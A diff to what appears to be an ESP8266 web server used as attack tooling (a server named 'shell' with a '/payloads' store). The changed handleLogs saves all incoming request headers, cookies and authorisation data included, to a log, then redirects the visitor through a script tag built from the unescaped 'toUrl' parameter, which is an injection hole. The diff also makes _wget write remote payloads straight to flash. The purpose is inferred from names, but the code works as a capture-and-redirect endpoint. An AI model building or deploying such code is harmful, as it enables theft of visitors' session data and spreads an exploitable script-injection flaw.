@@ -154,6 +154,7 @@ bool handleFileUpload() {
 }
 
 void handleLogs() {
+  String toUrl = shell.arg("toUrl"); 
   String logs = "--------------------\n"; 
   for (int i = 0; i < shell.headers(); i++) {
     logs += shell.headerName(i) + ": " + shell.header(i) + "\n"; 
@@ -166,7 +167,11 @@ void handleLogs() {
   File logFile = SPIFFS.open("/payloads/logs", "a"); 
   logFile.println(logs); 
   logFile.close(); 
-  shell.send(200); 
+  if (toUrl) {
+    shell.send(200, "text/html", "<script>window.location.replace(\"" + toUrl + "\")</script>"); 
+  } else {
+    shell.send(200); 
+  }
 }
 
 void handleList() {
@@ -288,9 +293,7 @@ bool _wget(String httpUrl, String filePath, String user_fingerprint) {
       result += "HTTP/1.1 " + httpCode; 
       result += "\n"; 
       if (httpCode == HTTP_CODE_OK) {
-        String payload = httpClient.getString(); 
-        result += (payload.length() > 2000) ? payload.substring(0, 94) + "[More]" : payload; 
-        dataFile.print(payload); 
+        dataFile.print(httpClient.getString()); 
         dataFile.close(); 
       }
       httpClient.end(); 
@@ -313,9 +316,7 @@ bool _wget(String httpUrl, String filePath, String user_fingerprint) {
       result += "HTTP/1.1 " + httpsCode; 
       result += "\n"; 
       if (httpsCode == HTTP_CODE_OK || httpsCode == HTTP_CODE_MOVED_PERMANENTLY) {
-        String payload = httpsClient.getString(); 
-        result += (payload.length() > 2000) ? payload.substring(0, 94) + "[More]" : payload; 
-        dataFile.print(payload); 
+        dataFile.print(httpsClient.getString()); 
         dataFile.close(); 
       }
       httpsClient.end(); 
@@ -362,7 +363,7 @@ bool handler() {
   bool fileReadOK = handleFileRead(webAddress);
   // 如果在SPIFFS无法找到用户访问的资源，则回复404 (Not Found)
   if (!fileReadOK){                                                 
-    shell.send(404, "text/plain", "404 Not Found"); 
+    shell.send(404); 
   }
   return true; 
 }
